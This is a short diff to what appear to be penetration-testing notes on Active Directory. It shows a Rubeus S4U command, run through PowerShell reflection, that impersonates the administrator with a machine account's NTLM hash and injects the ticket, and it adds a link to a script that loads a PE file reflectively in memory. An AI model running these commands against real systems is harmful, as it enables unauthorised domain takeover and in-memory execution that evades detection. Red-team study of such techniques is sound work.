@@ -85,3 +85,6 @@ Luid: 0x0
 [+] Tickets successfully purged!
 
 PS C:\> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:<ntlm_hash> /impersonateuser:administrator /msdsspn:<spn> /ptt".Split())  -> Example of calling Rubeus with arguments thourgh reflection
+```
+
+Alternatively we can use this script to reflecitvely load an x64 base64 PE(Portable Executable): https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs 
